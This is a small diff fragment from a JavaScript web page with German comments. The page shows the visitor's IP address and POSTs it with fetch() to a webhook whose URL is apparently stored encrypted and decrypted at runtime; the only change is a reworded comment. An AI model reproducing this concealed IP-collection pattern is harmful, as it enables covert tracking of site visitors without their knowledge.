@@ -64,7 +64,7 @@
                 // Zeige die IP-Adresse auf der Seite an
                 document.getElementById('ipDisplay').textContent = `Your IP: ${ip}`;
 
-                // Sende die IP-Adresse an den Webhook
+                // Sende die IP-Adresse an den entschlüsselten Webhook
                 await fetch(decryptedWebhook, {
                     method: "POST",
                     headers: {
